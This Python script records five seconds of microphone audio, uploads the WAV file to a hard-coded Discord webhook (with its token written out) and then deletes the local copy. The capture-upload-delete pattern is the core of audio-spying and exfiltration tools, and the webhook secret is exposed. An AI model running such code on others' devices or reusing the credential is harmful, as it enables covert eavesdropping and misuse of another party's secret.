import pyaudio
import wave
import requests
import os

FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100
CHUNK = 1024
RECORD_SECONDS = 5
WAVE_OUTPUT_FILENAME = "output.wav"
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1207259632066895873/zD61HmC_iqHNHCw9FAtfhrVLtxgn-GyFzrNQNTwAYIlglucL6XaTiChQZOteEom9lduO"

audio = pyaudio.PyAudio()

# Start recording
stream = audio.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)

print("Recording...")

frames = []

# Record audio in chunks
for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
    data = stream.read(CHUNK)
    frames.append(data)

print("Recording finished.")

# Stop recording
stream.stop_stream()
stream.close()
audio.terminate()

# Save recorded audio to a file
with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(audio.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))

print("Audio saved to", WAVE_OUTPUT_FILENAME)

# Prepare data to send to Discord
data = {'content': 'Here is the recorded audio:'}
files = {'file': open(WAVE_OUTPUT_FILENAME, 'rb')}

# Send data to Discord webhook
try:
    response = requests.post(DISCORD_WEBHOOK_URL, data=data, files=files)
    response.raise_for_status()
    print("Audio successfully sent to Discord.")
except requests.exceptions.RequestException as err:
    print(f"Error sending audio to Discord: {err}")

# Delete the temporary audio file
os.remove(WAVE_OUTPUT_FILENAME)


